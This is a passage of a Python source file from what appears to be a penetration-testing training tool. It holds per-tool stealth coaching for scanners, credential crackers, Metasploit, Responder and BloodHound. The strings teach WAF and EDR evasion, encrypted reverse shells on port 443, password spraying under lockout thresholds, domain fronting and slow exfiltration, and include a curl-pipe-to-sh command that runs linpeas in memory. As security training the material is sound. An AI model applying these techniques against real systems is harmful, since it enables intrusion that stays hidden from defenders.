"""
╔══════════════════════════════════════════════════════════════════╗
║         ERR0RS ULTIMATE — SOC MENTOR LESSON LAYER                ║
║              src/core/soc_mentor.py                               ║
║                                                                  ║
║  Adds strategic / OPSEC / next-step coaching to lesson topics.   ║
║  Lives separate from teach_engine.py so the bulk lesson dict     ║
║  stays focused on tool reference; this layer adds the SOC mentor ║
║  voice — what to do next, how loud is it, why.                   ║
║                                                                  ║
║  Constitution (Eros, 2026-05-29):                                ║
║    "ERR0RS is the ultimate SOC mentor. He should teach his SOC   ║
║     apprentice how to be as stealthy and quiet as possible, as   ║
║     to not expose the test until the operator is ready for the   ║
║     client to know that they are in."                            ║
║                                                                  ║
║  Every recommendation here is ordered: quietest first.           ║
║                                                                  ║
║  Author: Gary Holden Schneider (Eros) | GitHub: Gnosisone        ║
╚══════════════════════════════════════════════════════════════════╝
"""

from typing import Dict, List, Optional

# Noise level taxonomy. The user sees these badges; the engine sorts by them.
#   quiet  — passive or single-probe; minimal log signature
#   medium — active probing but at human pace; appears in logs but not alerting
#   loud   — high-volume / signature-y; triggers IDS/WAF/SOC alerts
NOISE_LEVELS = {
    "quiet":  {"icon": "🟢", "label": "QUIET",  "order": 0},
    "medium": {"icon": "🟡", "label": "MEDIUM", "order": 1},
    "loud":   {"icon": "🔴", "label": "LOUD",   "order": 2},
}


# ── MENTOR DATA — first slice: 6 topics from Mission 01 + common chains ─────
# Each entry adds the SOC-mentor coaching layer on top of the tool reference
# in teach_engine.py LESSONS. Order matters in logical_next — quietest first.
MENTOR = {
    "nmap": {
        "tldr": (
            "Reconnaissance — find what's reachable before you touch it. "
            "How you scan determines whether the SOC sees you arrive."
        ),
        "noise_level": "quiet",
        "noise_explanation": (
            "Default -sS SYN scan never completes the TCP handshake, so most "
            "application logs see nothing. -T0/-T1 timing + -p (specific ports) "
            "keeps you under most rate-based IDS thresholds. -A and -p- are "
            "where nmap goes from quiet to medium."
        ),
        "prerequisites": ["network_route_to_target"],
        "logical_next": [
            {
                "tool": "whatweb",
                "noise": "quiet",
                "why": "Passive HTTP fingerprint on any open web port — no scanner signature.",
            },
            {
                "tool": "nikto",
                "noise": "medium",
                "why": "If you found HTTP/HTTPS, nikto enumerates known web vulns. Noisier than nmap; expect requests in access logs.",
            },
            {
                "tool": "enum4linux",
                "noise": "medium",
                "why": "If 139/445 SMB is open, this is the standard next step for AD enumeration.",
            },
        ],
        "opsec_tips": [
            "Use -T2 or -T1 if you suspect IDS — slower scans look like background noise.",
            "Scan from a single source you control; rotating IPs looks more suspicious than steady probes.",
            "Limit ports (-p 80,443,22,3389) on first pass — full port sweeps (-p-) are signature-y.",
            "-Pn skips ICMP — useful when the target blocks ping AND keeps you off ping-flood detection.",
        ],
    },

    "nikto": {
        "tldr": (
            "Known-vuln web scanner — fast survey of OWASP-style issues. "
            "Will hit hundreds of URLs in seconds; expect to show up in WAF logs."
        ),
        "noise_level": "medium",
        "noise_explanation": (
            "Nikto sends 6,700+ probes by default and identifies itself in the "
            "User-Agent string. Every WAF in production will tag it as a scanner. "
            "Use only against assets you own or have written permission for, "
            "and consider -evasion 1 to break up the signature."
        ),
        "prerequisites": ["http_or_https_open"],
        "logical_next": [
            {
                "tool": "gobuster",
                "noise": "medium",
                "why": "Directory enumeration finds endpoints nikto didn't probe. Use the same wordlist family for consistency.",
            },
            {
                "tool": "whatweb",
                "noise": "quiet",
                "why": "Cross-check nikto's fingerprint with whatweb's quieter passive analysis.",
            },
            {
                "tool": "sqlmap",
                "noise": "loud",
                "why": "If nikto flagged a SQLi-prone parameter, sqlmap confirms and exploits. Save for last — heavily logged.",
            },
        ],
        "opsec_tips": [
            "Use -evasion 1-8 to randomize URI encoding and break IDS signatures.",
            "-useragent 'Mozilla/5.0 ...' makes you look like a browser instead of a scanner.",
            "-Tuning 4,5,6 skips DoS / file upload / brute checks — much quieter.",
            "Run against a staging URL during business hours when traffic is noisy — your probes blend in.",
        ],
    },

    "gobuster": {
        "tldr": (
            "Directory and DNS bruteforcer — finds hidden paths and subdomains. "
            "Sends one HTTP request per wordlist entry; rate is what makes it loud."
        ),
        "noise_level": "medium",
        "noise_explanation": (
            "Gobuster's noise is purely volumetric — a common.txt wordlist is "
            "4,614 requests. Default 10 threads ⇒ ~100 req/s ⇒ instant SOC alert "
            "on most production assets. --delay and --threads are your stealth knobs."
        ),
        "prerequisites": ["http_or_https_open", "wordlist_chosen"],
        "logical_next": [
            {
                "tool": "ffuf",
                "noise": "medium",
                "why": "If gobuster found dynamic endpoints, ffuf parameter-fuzzes them for hidden args. Same noise class.",
            },
            {
                "tool": "nuclei",
                "noise": "medium",
                "why": "Run nuclei templates against discovered endpoints — catches misconfigs gobuster doesn't.",
            },
            {
                "tool": "sqlmap",
                "noise": "loud",
                "why": "Any discovered endpoint with query strings (?id=...) — test for SQLi here.",
            },
        ],
        "opsec_tips": [
            "--threads 5 --delay 250ms keeps you under most rate limiters AND looks like one browsing user.",
            "Use a small wordlist first (common.txt) before raft-large or seclists — fewer hits = less log volume.",
            "Filter by status code (-s 200,301,302) to avoid wasting requests on 404s that get logged anyway.",
            "Custom -H 'User-Agent: ...' avoids the 'Go-http-client' default that's a known scanner signature.",
        ],
    },

    "sqlmap": {
        "tldr": (
            "SQL injection automation — confirms vuln and extracts data. "
            "Inherently loud: every test is an attack signature. Use only on confirmed-vulnerable params."
        ),
        "noise_level": "loud",
        "noise_explanation": (
            "sqlmap fires payloads from boolean-blind, time-blind, error-based, "
            "UNION, and stacked-query families. Each request is a textbook attack "
            "pattern. WAFs catch >90% of default payloads. This is end-of-chain — "
            "you only sqlmap a target you're certain is in-scope and that you've "
            "already silently verified is vulnerable."
        ),
        "prerequisites": ["confirmed_injectable_param", "in_scope"],
        "logical_next": [
            {
                "tool": "hashcat",
                "noise": "quiet",
                "why": "If sqlmap dumped password hashes, hashcat cracks them offline. Offline = silent.",
            },
            {
                "tool": "metasploit",
                "noise": "loud",
                "why": "If you extracted DB credentials, pivot via metasploit's mysql_login / postgres modules.",
            },
            {
                "tool": "responder",
                "noise": "loud",
                "why": "If you found internal hostnames in the dumped data, responder may catch credentials on the LAN.",
            },
        ],
        "opsec_tips": [
            "--random-agent rotates User-Agent per request — defeats simple WAF blocks.",
            "--delay 2 --timeout 15 looks more like a slow user than a scanner.",
            "--tamper=space2comment,charunicodeencode bypasses many WAF signatures.",
            "Always start with --batch --level 1 --risk 1; escalate only if nothing fires. Lower levels are quieter.",
        ],
    },

    "hydra": {
        "tldr": (
            "Online credential bruteforcer — tries username/password combos against a live service. "
            "Loudest tool in the kit; every guess is an authentication attempt that gets logged."
        ),
        "noise_level": "loud",
        "noise_explanation": (
            "Every hydra attempt is a failed login event that lights up every "
            "SIEM in production. Account lockout policies will lock real users "
            "out if you're not careful. SSH brute against a modern target gets "
            "you fail2ban-banned in seconds. Use only with explicit written "
            "permission and prefer offline cracking (hashcat) when possible."
        ),
        "prerequisites": ["service_accepting_logins", "known_username_OR_user_list"],
        "logical_next": [
            {
                "tool": "hashcat",
                "noise": "quiet",
                "why": "If you obtained password hashes from another vector, ALWAYS prefer offline hashcat over online hydra.",
            },
            {
                "tool": "crackmapexec",
                "noise": "medium",
                "why": "Once you have valid creds, crackmapexec sprays them across the AD environment.",
            },
            {
                "tool": "metasploit",
                "noise": "medium",
                "why": "Valid creds → metasploit's auxiliary scanners for that protocol enumerate further.",
            },
        ],
        "opsec_tips": [
            "-t 4 keeps threads low; -W 5 adds 5s wait between attempts — looks like a confused user, not a bot.",
            "Spray, don't brute: try one password against many users (e.g. 'Welcome1' across the org) instead of many passwords against one user. Avoids lockouts.",
            "Use account lockout thresholds you already know — try N-1 attempts then stop, wait the reset window, repeat.",
            "Prefer offline cracking — if you can get a hash, hashcat is silent and unlimited.",
        ],
    },

    "netcat": {
        "tldr": (
            "TCP/UDP swiss-army knife — listener, port scanner, file transfer, reverse shell. "
            "Inherently quiet: it's just network primitives. Loudness depends on what you do with it."
        ),
        "noise_level": "quiet",
        "noise_explanation": (
            "nc itself is just a socket. A listener does nothing until something "
            "connects to it. A scan (nc -zv) is essentially what nmap does. The "
            "ONLY thing that makes nc loud is the payload — a reverse shell "
            "callback shows up in egress logs, but the nc on either end is silent. "
            "This is why nc remains the go-to for post-exploitation: it's already "
            "on most Linux boxes and looks like normal traffic."
        ),
        "prerequisites": [],
        "logical_next": [
            {
                "tool": "socat",
                "noise": "quiet",
                "why": "Once you have a basic nc shell, upgrade to socat for full TTY (Tab completion, Ctrl+C, etc.).",
            },
            {
                "tool": "linpeas",
                "noise": "quiet",
                "why": "After landing a reverse shell, linpeas enumerates local privesc paths. Read-only — totally quiet.",
            },
            {
                "tool": "metasploit",
                "noise": "medium",
                "why": "Upgrade the nc shell to a meterpreter session for stage migration, process injection, etc.",
            },
        ],
        "opsec_tips": [
            "Use port 443 for callbacks — egress firewalls usually permit it and it blends with HTTPS traffic.",
            "Prefer reverse shells over bind shells — most networks block inbound, allow outbound.",
            "Encrypt your reverse shell with openssl s_client / s_server — payload looks like TLS traffic to the egress filter.",
            "Pin your listener to a domain you control with valid TLS — looks like normal web traffic on packet capture.",
        ],
    },

    # ── Tools ──────────────────────────────────────────────────────────────
    "whatweb": {
        "tldr": (
            "Passive HTTP fingerprinter — identifies CMS, frameworks, plugins, "
            "and tech stack from response headers and body content. Send ONE "
            "request per target — almost invisible in logs."
        ),
        "noise_level": "quiet",
        "noise_explanation": (
            "Default whatweb sends a single GET request and parses the response. "
            "Same footprint as opening the site in a browser. The only signature "
            "is the User-Agent string — change it with --user-agent to be "
            "indistinguishable from a real visitor."
        ),
        "prerequisites": ["http_or_https_open"],
        "logical_next": [
            {"tool": "nuclei", "noise": "medium",
             "why": "whatweb identifies WHAT — nuclei finds WEAKNESSES in that stack with targeted templates."},
            {"tool": "gobuster", "noise": "medium",
             "why": "If whatweb fingerprinted a known CMS, use that CMS's specific wordlist (wp-content/, /admin/, etc)."},
            {"tool": "nikto", "noise": "medium",
             "why": "Generic web vuln scan if no specific stack was identified."},
        ],
        "opsec_tips": [
            "--user-agent 'Mozilla/5.0 (Windows NT 10.0)' makes the request look like a normal user.",
            "-a 1 (aggression 1, default) sends exactly ONE request. Higher levels probe more, noisier.",
            "Aggregate results across multiple targets locally — don't re-scan when you already have the data.",
            "Pair with passive-DNS/Shodan data first — they may already have the answer with no requests at all.",
        ],
    },

    "ffuf": {
        "tldr": (
            "Fast web fuzzer — discovers hidden paths, params, vhosts, and headers. "
            "Strength is speed; that's also what makes it loud unless you throttle it."
        ),
        "noise_level": "medium",
        "noise_explanation": (
            "ffuf's default ~40 req/s with a 10k wordlist = SOC alert in under "
            "5 minutes. The tool itself is silent (no signature in headers), "
            "but the request RATE is the giveaway. -p (delay) and -rate "
            "are your stealth controls."
        ),
        "prerequisites": ["http_or_https_open", "wordlist_chosen"],
        "logical_next": [
            {"tool": "nuclei", "noise": "medium",
             "why": "Once ffuf found endpoints, nuclei tests each for known vulns."},
            {"tool": "sqlmap", "noise": "loud",
             "why": "If ffuf surfaced parameterized URLs (?id=, ?user=), sqlmap probes those for injection."},
            {"tool": "gobuster", "noise": "medium",
             "why": "Use ffuf for params/vhosts; gobuster for directory walks. They complement, not duplicate."},
        ],
        "opsec_tips": [
            "-rate 5 caps requests per second — looks like one human user, not a scanner.",
            "-p 1-2 inserts random 1-2s delay between requests. Defeats rate-based IDS.",
            "-mc 200,301,302 only shows real responses — saves you reviewing thousands of 404s.",
            "-H 'User-Agent: Mozilla/...' avoids the default 'Fuzz Faster U Fool' fingerprint in logs.",
        ],
    },

    "nuclei": {
        "tldr": (
            "Template-driven vuln scanner — runs YAML-defined checks for known CVEs "
            "and misconfigs. Surgical: only probes for what you tell it to. Quieter than nikto."
        ),
        "noise_level": "medium",
        "noise_explanation": (
            "Each template fires 1-3 requests. A default scan with -t cves/ runs "
            "thousands of templates so total request count is high, but each "
            "individual probe looks like targeted exploitation rather than "
            "scanner noise. Tune with -severity or -tags to stay narrow."
        ),
        "prerequisites": ["http_or_https_open", "target_fingerprinted"],
        "logical_next": [
            {"tool": "metasploit", "noise": "medium",
             "why": "If nuclei found a known CVE with a Metasploit module, weaponize it there."},
            {"tool": "sqlmap", "noise": "loud",
             "why": "nuclei flagged a SQLi-vulnerable endpoint? sqlmap confirms and exploits."},
            {"tool": "ffuf", "noise": "medium",
             "why": "Use ffuf to enumerate parameters on endpoints nuclei flagged as interesting."},
        ],
        "opsec_tips": [
            "-severity critical,high keeps it focused — fewer requests, more signal.",
            "-tags exposure,misconfig is much quieter than -tags cve (CVE checks fire exploits).",
            "-rate-limit 50 keeps request rate civil. Default 150 will trip WAFs.",
            "-no-color and -silent for clean logs you can grep later.",
        ],
    },

    "metasploit": {
        "tldr": (
            "Exploit framework — verified PoC code for thousands of CVEs plus post-ex modules. "
            "Inherently loud: every exploit is an attack. Use with confirmed vulns and explicit scope."
        ),
        "noise_level": "loud",
        "noise_explanation": (
            "Metasploit payloads have well-known signatures. Every modern EDR "
            "tags meterpreter sessions within seconds. The framework itself is "
            "fine — it's the default payloads + handlers that get caught. "
            "Custom encoders, staged payloads, and migrate-on-callback help but "
            "don't make MSF stealthy. Only fire when you've already confirmed "
            "the vuln and have an acceptable detection budget."
        ),
        "prerequisites": ["confirmed_cve", "scope_authorized", "callback_path"],
        "logical_next": [
            {"tool": "mimikatz", "noise": "loud",
             "why": "Once you have SYSTEM via meterpreter, mimikatz pulls credentials. Both light up EDR."},
            {"tool": "bloodhound", "noise": "medium",
             "why": "Beachhead established — map the rest of the AD environment for the next pivot."},
            {"tool": "linpeas", "noise": "quiet",
             "why": "On Linux callbacks, linpeas is silent — read-only enumeration for privesc paths."},
        ],
        "opsec_tips": [
            "Use staged payloads (windows/x64/meterpreter/reverse_tcp NOT windows/x64/meterpreter_reverse_tcp) — smaller initial download, fewer AV hits.",
            "set EnableStageEncoding true + set StageEncoder x64/xor — beats signature-based EDR.",
            "set ExitOnSession false on your handler — multiple sessions from one campaign.",
            "Immediately 'migrate <PID>' to a long-running process — meterpreter is killed if its parent process exits.",
        ],
    },

    "hashcat": {
        "tldr": (
            "Offline password cracker — runs on GPU/CPU against captured hashes. "
            "SILENT by design: never touches the target. Prefer this over hydra whenever you have a hash."
        ),
        "noise_level": "quiet",
        "noise_explanation": (
            "Hashcat is local-only — no packets, no logs, no detection. The "
            "noise was in OBTAINING the hashes (mimikatz dump, sqlmap extract, "
            "responder capture). Once you have them, hashcat is invisible. "
            "This is why the SOC mentor's rule is: 'always prefer offline "
            "cracking over online brute force.'"
        ),
        "prerequisites": ["password_hashes_obtained"],
        "logical_next": [
            {"tool": "crackmapexec", "noise": "medium",
             "why": "Cracked password? Spray it across the AD environment with crackmapexec."},
            {"tool": "metasploit", "noise": "medium",
             "why": "Valid creds → MSF's psexec / smb_login modules for lateral movement."},
            {"tool": "responder", "noise": "loud",
             "why": "Use the cracked hash pattern to inform what response policies (LLMNR/NBT-NS) to target next."},
        ],
        "opsec_tips": [
            "-w 3 (workload profile high) for fast cracking; -w 4 (insane) only if you control the box and need answers fast.",
            "Mask attacks (-a 3 ?u?l?l?l?l?l?d?d) target the org's known password pattern — much faster than brute.",
            "Combine rockyou.txt with -r rules/best64.rule — 90%+ of corporate passwords crack within minutes.",
            "Crack offline, on YOUR hardware. Never upload hashes to online crackers; they log everything.",
        ],
    },

    "crackmapexec": {
        "tldr": (
            "AD swiss-army knife — enumerates and authenticates against SMB/WinRM/MSSQL/SSH. "
            "Medium noise: every spray attempt is a logged authentication event."
        ),
        "noise_level": "medium",
        "noise_explanation": (
            "Each crackmapexec request is one auth attempt logged on every "
            "target. Sprays of 5+ creds across 50+ hosts = 250+ failed-login "
            "events in your SIEM. The tool itself is detected by EDR based "
            "on its query patterns. Single targeted auth checks blend in; "
            "wide sprays light up like Christmas."
        ),
        "prerequisites": ["valid_credentials", "ad_network_access"],
        "logical_next": [
            {"tool": "bloodhound", "noise": "medium",
             "why": "Authenticated to a host? Now collect AD relationships from inside. Off-domain bloodhound-python is the move."},
            {"tool": "mimikatz", "noise": "loud",
             "why": "Local admin on the box (via cme --local-auth)? Pull all the secrets."},
            {"tool": "responder", "noise": "loud",
             "why": "If creds don't work, drop responder on the segment to catch new ones."},
        ],
        "opsec_tips": [
            "Spray ONE password at a time across hosts — minimizes account lockouts vs trying many passwords per account.",
            "Test with low-privilege creds first to map what you can SEE before trying privileged ones.",
            "--continue-on-success false stops as soon as you get a hit — every extra request adds risk.",
            "--no-bruteforce when spraying — single-pass logon attempts look more like a user typo than a brute.",
        ],
    },

    "responder": {
        "tldr": (
            "LLMNR/NBT-NS/MDNS poisoner — sits on a LAN, answers broadcast name "
            "requests with attacker IP, captures NTLMv2 hashes when victims try to auth. "
            "Loud: every NBT response is logged on Windows hosts."
        ),
        "noise_level": "loud",
        "noise_explanation": (
            "Responder works by REPLYING to broadcasts you shouldn't be replying "
            "to. Modern Windows networks have LLMNR/NBT-NS disabled — using "
            "responder there fails AND alerts. Where it DOES still work (most "
            "internal corporate LANs), every poisoned response gets logged by "
            "the target. Best deployed during high-traffic hours when responses "
            "blend with normal mis-types."
        ),
        "prerequisites": ["lan_access_layer2", "llmnr_or_nbtns_enabled"],
        "logical_next": [
            {"tool": "hashcat", "noise": "quiet",
             "why": "Captured NTLMv2 hashes go straight to hashcat for offline cracking. -m 5600."},
            {"tool": "crackmapexec", "noise": "medium",
             "why": "Got a cracked password from responder hashes? Spray it back across the network."},
            {"tool": "bloodhound", "noise": "medium",
             "why": "Once you have ANY domain creds (cracked or relayed), map the AD attack paths."},
        ],
        "opsec_tips": [
            "-A (analyze mode) listens silently — observe LLMNR traffic without poisoning. Tells you what's exploitable BEFORE you light up.",
            "Disable HTTP/HTTPS/SMB servers you don't need (-r off -d off in Responder.conf) — fewer services running = smaller signature.",
            "Run during peak hours (Monday morning, login storms) — your responses blend in with normal name resolution noise.",
            "Pair with ntlmrelayx instead of just capturing — relay attacks don't need cracking and bypass lockout policies.",
        ],
    },

    "enum4linux": {
        "tldr": (
            "SMB / Samba enumeration — pulls users, shares, groups, password policy from Windows / Samba servers. "
            "Medium noise: each query is logged, but enumeration auths are common in normal admin traffic."
        ),
        "noise_level": "medium",
        "noise_explanation": (
            "enum4linux makes dozens of RPC calls per run — null sessions, "
            "RID cycling, share enumeration. Modern Windows logs these as "
            "anonymous/null-session events. Some are still allowed in 2026 "
            "depending on config. The tool is well-known to EDR signatures, "
            "so consider enum4linux-ng (the rewrite) or impacket-rpcdump for "
            "lower-signature alternatives."
        ),
        "prerequisites": ["smb_port_open_139_or_445"],
        "logical_next": [
            {"tool": "crackmapexec", "noise": "medium",
             "why": "User list from enum4linux → spray a common password (Welcome1, Spring2026!) with crackmapexec."},
            {"tool": "responder", "noise": "loud",
             "why": "If null sessions are blocked, drop responder on the same segment to catch credentials passively."},
            {"tool": "bloodhound", "noise": "medium",
             "why": "Enumerated users feed directly into bloodhound for attack-path mapping."},
        ],
        "opsec_tips": [
            "-U (users only) is quieter than -a (everything) — focused queries look like targeted admin work.",
            "Use enum4linux-ng over the original — modernized RPC handling, less buggy, fewer retries that fingerprint as scanning.",
            "Run during business hours when admin tooling normally hits these RPC endpoints.",
            "Cross-reference findings with passive DNS / Shodan first — sometimes you don't need to query at all.",
        ],
    },

    "bloodhound": {
        "tldr": (
            "Active Directory attack-path mapper — visualizes shortest path to Domain Admin "
            "by ingesting users/groups/sessions/ACLs and finding privilege paths."
        ),
        "noise_level": "medium",
        "noise_explanation": (
            "BloodHound itself is a UI — the noise is in the collector. "
            "SharpHound (on-domain) makes hundreds of LDAP queries; defenders "
            "with proper monitoring catch this. bloodhound-python (off-domain, "
            "needs creds) makes the same queries but FROM your attacker box, "
            "blending with normal admin tools. Sessions collection (-c Session) "
            "is the loudest part — touches every workstation."
        ),
        "prerequisites": ["valid_domain_credentials"],
        "logical_next": [
            {"tool": "crackmapexec", "noise": "medium",
             "why": "BloodHound showed a path? Use crackmapexec to test which intermediate hosts you can actually auth to."},
            {"tool": "mimikatz", "noise": "loud",
             "why": "Path requires hash you don't have? Mimikatz on a stepping-stone box pulls it."},
            {"tool": "metasploit", "noise": "loud",
             "why": "If BloodHound found a Kerberoastable account, MSF's auxiliary modules + hashcat -m 13100 do the rest."},
        ],
        "opsec_tips": [
            "Use bloodhound-python OFF-DOMAIN from your attacker box — leaves no agent on the target.",
            "-c DCOnly is the quietest collection — only queries the DC, no session enumeration on workstations.",
            "Avoid --zip on the wire — encrypt and exfil the JSON separately to leave less evidence on the source box.",
            "Run the collection during normal business hours; LDAP queries blend with everyday admin tooling.",
        ],
    },

    "linpeas": {
        "tldr": (
            "Linux privesc enumerator — reads every file, env var, cron, sudoer, SUID binary, "
            "and known-CVE indicator on a target. READ-ONLY: silent by design."
        ),
        "noise_level": "quiet",
        "noise_explanation": (
            "linpeas is bash + grep + cat. No exploitation, no writes, no "
            "network. Auditd CAN log the readsbut few orgs have auditd "
            "tuned to alert on broad reads. The risk isn't detection during "
            "RUN — it's the script LANDING on the box. Pipe-from-curl or "
            "memory-only execution avoids the file footprint entirely."
        ),
        "prerequisites": ["shell_on_linux_target"],
        "logical_next": [
            {"tool": "metasploit", "noise": "medium",
             "why": "linpeas flagged a kernel CVE or SUID exploit path? MSF often has a working module."},
            {"tool": "hashcat", "noise": "quiet",
             "why": "Found /etc/shadow readable? Pull hashes, crack offline. Silent."},
            {"tool": "netcat", "noise": "quiet",
             "why": "Found a writable cron or sudoer entry? netcat reverse shell for the privesc, no MSF needed."},
        ],
        "opsec_tips": [
            "Memory-only: curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh — no file written.",
            "Redirect output to a tmpfs path (/dev/shm/...) — survives the session, gone on reboot.",
            "Run with -q (quiet) to skip ASCII art if you're piping to a slow shell.",
            "Diff linpeas output across boxes — same env vars often = shared creds the SOC team won't notice.",
        ],
    },

    "incident-response": {
        "tldr": (
            "Blue-team discipline of detecting, containing, eradicating, and recovering "
            "from security incidents. As a red-teamer: knowing IR makes you a better attacker — "
            "you understand what defenders will see and how fast they'll move."
        ),
        "noise_level": "quiet",
        "noise_explanation": (
            "IR knowledge itself is the quietest thing possible — it's a "
            "mindset, not a tool. Understanding the IR playbook tells you "
            "WHEN your activity transitions from 'no one noticed' to 'they "
            "see something but don't know what' to 'they're actively hunting "
            "you.' Each phase changes your OPSEC priorities."
        ),
        "prerequisites": [],
        "logical_next": [
            {"tool": "mitre", "noise": "quiet",
             "why": "ATT&CK framework maps every IR detection back to attacker behavior. Learn what defenders monitor."},
            {"tool": "threat-modeling", "noise": "quiet",
             "why": "Build your engagement plan with defender awareness baked in from the start."},
            {"tool": "kill-chain", "noise": "quiet",
             "why": "Lockheed kill chain phases align with IR detection windows — pick your loud actions for phases where detection is slow."},
        ],
        "opsec_tips": [
            "Know the target's IR maturity BEFORE you start. Mature SOC = different game than unmonitored.",
            "Triage windows are typically 15-60 minutes from alert. Have your persistence in place before that.",
            "IR teams check process trees, network beacons, file modifications. Stay off all three when possible.",
            "Living-off-the-land tools (powershell, wmi, certutil) sit in the 'normal admin' category that IR triages slower than known malware.",
        ],
    },

    "kill-chain": {
        "tldr": (
            "Lockheed Martin's 7-phase model: Recon → Weaponize → Deliver → Exploit → Install → C2 → Actions. "
            "Frames an attack as a sequence the defender must DISRUPT at SOME phase to win."
        ),
        "noise_level": "quiet",
        "noise_explanation": (
            "Kill-chain is a model, not a tool. Knowing it changes how you "
            "operate: each phase has a typical detection-difficulty curve "
            "(Recon: hard to detect; Exploit: easy; C2: very easy if not "
            "obfuscated). You sequence loud actions for phases where you've "
            "already burned detection (post-exploit) and stay maximally quiet "
            "during Recon / Weaponize when defenders have the most to gain."
        ),
        "prerequisites": [],
        "logical_next": [
            {"tool": "mitre", "noise": "quiet",
             "why": "MITRE ATT&CK is the modern, more granular evolution of kill-chain. Both, not either."},
            {"tool": "threat-modeling", "noise": "quiet",
             "why": "Threat-modeling APPLIES the kill chain — pick which phase you'll defend (blue) or exploit (red)."},
            {"tool": "incident-response", "noise": "quiet",
             "why": "IR playbooks are STRUCTURED around interrupting the kill chain. Know what they're trying to do at each step."},
        ],
        "opsec_tips": [
            "Phase 1 (Recon): use passive only when possible. Active scans skip you straight to phase 3 in detection logs.",
            "Phase 4 (Exploit) is when defenders gain the most evidence. Have your phase 5 (Install) plan READY before phase 4 fires.",
            "Phase 6 (C2): beacon over allowed protocols (HTTPS, DNS), use domain fronting, randomize beacon intervals.",
            "Phase 7 (Actions on Objectives): this is when you EXFIL — by now you should already own enough to do it slowly.",
        ],
    },

    "mitre": {
        "tldr": (
            "MITRE ATT&CK is the canonical map of adversary TTPs. 14 tactics, 200+ techniques, "
            "1000+ sub-techniques. Every modern SOC, EDR, and threat intel report uses ATT&CK IDs."
        ),
        "noise_level": "quiet",
        "noise_explanation": (
            "ATT&CK is documentation. Reading it changes how you operate "
            "but generates ZERO logs. The value: when you're choosing a "
            "technique, look up its ATT&CK ID and check the 'Mitigations' "
            "and 'Detections' sections. That tells you EXACTLY what the "
            "defenders are watching for. Pick techniques where Detection "
            "coverage in your target's stack is low."
        ),
        "prerequisites": [],
        "logical_next": [
            {"tool": "threat-modeling", "noise": "quiet",
             "why": "Use ATT&CK IDs to label your threat model — speaks the same language as your client's security team."},
            {"tool": "incident-response", "noise": "quiet",
             "why": "IR playbooks are organized by ATT&CK tactic now. Understand the detection landscape from the inside."},
            {"tool": "metasploit", "noise": "medium",
             "why": "MSF modules are now ATT&CK-tagged. Pick exploits by tactic for your specific objective."},
        ],
        "opsec_tips": [
            "Before any technique: search attack.mitre.org for it, read the 'Detection' section, plan around it.",
            "Stay in techniques classified 'Living off the Land' (T1218: Signed Binary Proxy Execution) — they're hardest to catch.",
            "Avoid techniques marked with high CAR detection coverage in MITRE's analytics — those are well-defended.",
            "When writing reports, use ATT&CK IDs (T1059.001 not 'PowerShell') — pros take you more seriously.",
        ],
    },

    "owasp": {
        "tldr": (
            "Open Web Application Security Project — the de-facto standard for web app vulns. "
            "OWASP Top 10 is required reading for any web pentester. ASVS is the verification framework clients reference."
        ),
        "noise_level": "quiet",
        "noise_explanation": (
            "OWASP is documentation and tooling (ZAP, Juice Shop, etc.). "
            "The Top 10 itself is just a reference list. Where OWASP matters "
            "for OPSEC: clients EXPECT you to test against the Top 10. "
            "Findings get scored against ASVS. Reports that don't reference "
            "OWASP look unprofessional. This isn't a stealth concern — it's "
            "a credibility concern."
        ),
        "prerequisites": [],
        "logical_next": [
            {"tool": "nikto", "noise": "medium",
             "why": "Nikto checks for many OWASP Top 10 issues — known-vuln scanning baseline."},
            {"tool": "sqlmap", "noise": "loud",
             "why": "OWASP A03 (Injection) — sqlmap is the canonical tool for SQLi."},
            {"tool": "nuclei", "noise": "medium",
             "why": "nuclei has Top-10-tagged templates: -tags top10 hits the OWASP categories specifically."},
        ],
        "opsec_tips": [
            "Always cross-reference findings to OWASP IDs (A01, A03, etc.) in your report — clients tracking remediation maturity expect it.",
            "OWASP Juice Shop is the safest lab for practice — you OWN it, can't get in trouble.",
            "OWASP ZAP works alongside Burp — use ZAP for automated baseline, Burp for manual deep-dives.",
            "Subscribe to OWASP mailing lists — new vulnerability classes get tagged here before they hit CVE feeds.",
        ],
    },

    "cia": {
        "tldr": (
            "CIA Triad: Confidentiality, Integrity, Availability. The three pillars every security "
            "control protects. Knowing which pillar a finding affects is how you communicate severity to non-technical clients."
        ),
        "noise_level": "quiet",
        "noise_explanation": (
            "Conceptual framework — generates no logs. The OPSEC value: "
            "when you find a vuln, you can articulate the CIA impact "
            "(this exposes confidential data / lets attacker modify integrity / "
            "could be used for DoS affecting availability). That language "
            "moves your finding from 'theoretical' to 'business risk' in "
            "report writing."
        ),
        "prerequisites": [],
        "logical_next": [
            {"tool": "threat-modeling", "noise": "quiet",
             "why": "CIA + STRIDE = how to threat-model. STRIDE maps each letter to a CIA pillar."},
            {"tool": "owasp", "noise": "quiet",
             "why": "OWASP Top 10 categories all map cleanly to one or more CIA pillars."},
            {"tool": "cis", "noise": "quiet",
             "why": "CIS Controls map directly to CIA goals — see which controls protect each pillar."},
        ],
        "opsec_tips": [
            "In every report finding, name which CIA pillar(s) it affects — speeds executive-summary writing 10x.",
            "Modern frameworks (NIST CSF, ISO 27001) all build on CIA — use it as your foundational vocabulary.",
            "When trying to convince a client to pay attention to a finding, frame it in CIA terms — speaks to their risk officers.",
            "CIA gaps in YOUR OWN engagement tracking are equally important: are your notes confidential? Backed up? Available when needed?",
        ],
    },

    "cis": {
        "tldr": (
            "Center for Internet Security — publishes the CIS Controls (18 prioritized controls) and "
            "CIS Benchmarks (per-platform hardening guides). Used by many enterprises as their security baseline."
        ),
        "noise_level": "quiet",
        "noise_explanation": (
            "CIS is documentation. The OPSEC value: knowing CIS Controls tells "
            "you what's likely DEPLOYED at a target. CIS-CSC-aligned shops "
            "have Asset Inventory (CSC 1-2), Vuln Mgmt (CSC 7), Audit Logs "
            "(CSC 8), so plan around those defensive layers. Your stealth "
            "strategy differs hugely between a CIS-Level-1 shop and a "
            "Level-3 mature org."
        ),
        "prerequisites": [],
        "logical_next": [
            {"tool": "mitre", "noise": "quiet",
             "why": "MITRE provides the offensive map; CIS provides the defensive control list. Together = full picture."},
            {"tool": "threat-modeling", "noise": "quiet",
             "why": "CIS Controls give you the ground truth of what defenses likely exist at the target."},
            {"tool": "incident-response", "noise": "quiet",
             "why": "CSC 17 (Incident Response) is what IR teams reference — know their playbook."},
        ],
        "opsec_tips": [
            "Pre-engagement: ask the client what CIS Implementation Group (IG1/2/3) they target. Tells you the maturity instantly.",
            "If they're CIS-aligned, assume Audit Logs (CSC 8) are configured — quieter techniques will pay off.",
